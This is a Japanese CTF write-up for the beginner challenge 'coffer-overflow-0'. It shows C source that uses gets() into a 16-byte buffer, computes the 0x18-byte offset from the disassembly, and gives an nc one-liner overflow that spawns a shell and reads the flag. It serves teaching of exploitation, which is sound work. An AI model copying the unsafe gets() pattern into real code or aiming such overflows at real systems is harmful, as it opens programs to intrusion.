# coffer-overflow-0 (873 solves / 179 points)

> Can you fill up the coffers? We even managed to find the source for you.

coffer-overflow-0, coffer-overflow-0.cが添付されていた。

## solution

coffer-overflow.cは以下の通り

```c
#include <stdio.h>
#include <string.h>

int main(void)
{
  long code = 0;
  char name[16];

  setbuf(stdout, NULL);
  setbuf(stdin, NULL);
  setbuf(stderr, NULL);

  puts("Welcome to coffer overflow, where our coffers are overfilling with bytes ;)");
  puts("What do you want to fill your coffer with?");

  gets(name);

  if(code != 0) {
    system("/bin/sh");
  }
}
```
codeの値が書き換わっていたら`system('/bin/sh')`が実行されるだけのプログラムである。

```
  4006db:       48 8d 45 e0             lea    rax,[rbp-0x20]
  4006df:       48 89 c7                mov    rdi,rax
  4006e2:       e8 99 fe ff ff          call   400580 <gets@plt>
  4006e7:       48 83 7d f8 00          cmp    QWORD PTR [rbp-0x8],0x0
```

アセンブリソースをみるとnameとcodeは``0x20-0x8=0x18``離れていることがわかるので、適当な文字を24文字より多く入力するとcodeが書き換わる。

```
$ (echo "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"; cat) | nc 2020.redpwnc.tf 31199
Welcome to coffer overflow, where our coffers are overfilling with bytes ;)
What do you want to fill your coffer with?
ls
Makefile
bin
coffer-overflow-0
coffer-overflow-0.c
dev
flag.txt
lib
lib32
lib64
cat flag.txt
flag{b0ffer_0verf10w_3asy_as_123}
```
